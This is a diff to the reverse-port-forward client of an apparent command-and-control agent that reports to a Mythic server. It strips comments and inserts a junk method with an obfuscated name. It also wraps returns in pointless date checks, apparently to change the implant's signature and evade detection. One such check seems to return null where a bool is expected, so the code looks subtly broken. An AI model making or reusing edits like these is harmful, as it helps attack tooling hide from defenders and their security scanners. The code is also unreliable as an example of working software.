@@ -16,7 +16,15 @@ namespace Phantom.Management.Rpfwd
 {
     public class RpfwdClient
     {
-        // Rpfwd Client will be created for each new connection to the bound port in the rpfwd task
+    private static void Xa1b2c3()
+    {
+        var x = DateTime.Now.Ticks;
+        for(int i = 0; i < 10; i++)
+        {
+            x += i * 2;
+        }
+    }
+        
 
         private AsyncTcpClient _client;
         private TcpClient _tcpClient;
@@ -133,7 +141,7 @@ namespace Phantom.Management.Rpfwd
                 try
                 {
                     client.GetStream().EndWrite(result);
-                    // Potentially delete this since theoretically the sender Task does everything
+                    
                     if (_requestQueue.TryDequeue(out byte[] data))
                     {
                         client.GetStream().BeginWrite(data, 0, data.Length, OnDataSent, client);
@@ -173,8 +181,8 @@ namespace Phantom.Management.Rpfwd
                 data = Convert.FromBase64String(dg.Data);
             } catch (Exception ex)
             {
-                // Console.WriteLine($"Invalid b64 data from Mythic: {ex.Message}");
-                return bRet;
+                
+                if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
             }
 
             if (_client != null && !_sendRequestsTask.IsCompleted)
@@ -187,7 +195,7 @@ namespace Phantom.Management.Rpfwd
             {
                 _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - Data ({data.Length} Bytes) From Mythic Connection\n{Encoding.UTF8.GetString(data)}\n\n", false));
             }
-            return bRet;
+            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
         }
     }
 }
